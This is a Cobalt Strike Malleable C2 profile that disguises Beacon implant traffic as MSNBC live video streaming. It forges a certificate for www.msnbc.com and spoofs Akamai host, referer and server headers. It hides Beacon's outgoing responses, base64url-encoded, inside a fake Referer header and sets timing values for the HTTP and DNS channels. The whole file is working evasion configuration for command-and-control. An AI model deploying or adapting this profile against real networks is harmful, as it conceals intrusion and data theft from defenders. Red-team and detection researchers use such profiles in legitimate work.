#
# MSNBC Live Video
# 
# Author: @bluscreenofjeff
#

#set https cert info

#NOTE: As of writing, MSNBC doesn't support HTTS - these are made-up cert details based on nbc.com cert
https-certificate {
    set CN       "www.msnbc.com"; #Common Name
    set O        "General Electric Company"; #Organization Name
    set C        "US"; #Country
    set L        "Fairfield"; #Locality
    set OU       "Enterprise SSL Wildcard"; #Organizational Unit Name
    set ST       "CT"; #State or Province
    set validity "365"; #Number of days the cert is valid for
}

#default Beacon sleep duration and jitter
set sleeptime "1000";
set jitter    "20";

#default useragent for HTTP comms
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

#IP address used to indicate no tasks are available to DNS Beacon
set dns_idle "8.8.4.4";

#Force a sleep prior to each individual DNS request. (in milliseconds)
set dns_sleep "0";

#Maximum length of hostname when uploading data over DNS (0-255)
set maxdns    "235";

http-get {

    set uri "/z/msnbc2_live01@9615/manifest.f4m";

    client {

        header "Host" "msnbc2prod-lh.akamaihd.net";
        header "X-Requested-With" "ShockwaveFlash/24.0.0.186";
        header "Referer" "http://player.theplatform.com/p/7wvmTC/NBCOnAirProdPlayer/embed/select?s=msnbc";

        parameter "hdcore" "3.1";

        #session metadata
        metadata {
            netbios;
            parameter "g";
        }
    }


    server {

        header "Server" "AkamaiGHost";
        header "Mime-Version" "1.0";
        header "Content-Type" "video/abst";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Set-Cookie" "_alid_=RKs7UfhDqLr37whMpHIwBg==; path=/z/msnbc2_live01@9615/; domain=msnbc2prod-lh.akamaihd.net";

        #Beacon's tasks
        output {

            print;
        }
    }
}

http-post {
    
    set uri "/z/msnbc2_live01@6915/manifest.f4m";
    set verb "GET";

    client {

        header "Host" "msnbc2prod-lh.akamaihd.net";
        header "X-Requested-With" "ShockwaveFlash/24.0.0.186";

        parameter "hdcore" "3.1";

        #session ID
        id {
            netbios;
            base64url;
            parameter "g";
        }

        #Beacon's responses
        output {
            base64url;
            prepend "http://player.theplatform.com/p/";
            append "/NBCOnAirProdPlayer/embed/select?s=msnbc";
            header "Referer";    
        }
    }

    server {

        header "Server" "AkamaiGHost";
        header "Mime-Version" "1.0";
        header "Content-Type" "video/abst";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Set-Cookie" "_alid_=RKs7UfhDqLr37whMpHIwBg==; path=/z/msnbc2_live01@6915/; domain=msnbc2prod-lh.akamaihd.net";

        #empty
        output {
            print;
        }
    }
}

#change the stager server
http-stager {
    server {
        header "Content-Type" "image/gif";
    }
}
